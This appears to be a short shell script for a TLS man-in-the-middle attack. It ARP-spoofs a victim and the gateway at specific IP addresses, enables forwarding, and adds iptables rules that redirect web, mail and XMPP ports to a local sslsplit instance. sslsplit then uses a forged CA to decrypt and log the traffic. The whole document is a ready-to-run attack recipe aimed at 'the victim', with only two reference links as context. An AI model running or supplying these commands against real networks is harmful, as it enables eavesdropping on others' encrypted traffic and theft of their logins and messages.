# Tell the victim, I am the router.
sudo arpspoof -t 35.12.214.227 35.12.214.1
# Tell the router, I am the client.
sudo arpspoof -t 35.12.214.1 35.12.214.227

# Configure the iptables (make sure the victim can receive the packets)
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
# Start the ssl split (You should pre-create directory in /tmp folder)
sudo ./sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/sslsplit/logdir/ -k cakey.pem -c cacert.pem ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# Ref: https://www.roe.ch/SSLsplit
# Ref: https://blog.heckel.xyz/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/
